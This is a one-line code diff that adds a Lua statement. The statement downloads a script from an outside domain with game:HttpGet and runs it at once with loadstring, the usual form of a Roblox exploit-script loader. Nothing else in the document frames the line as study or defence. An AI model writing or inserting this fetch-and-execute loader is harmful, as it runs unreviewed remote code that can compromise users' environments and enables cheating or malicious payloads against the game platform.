@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://moonrise.gay/Whitelist.lua'),true))()
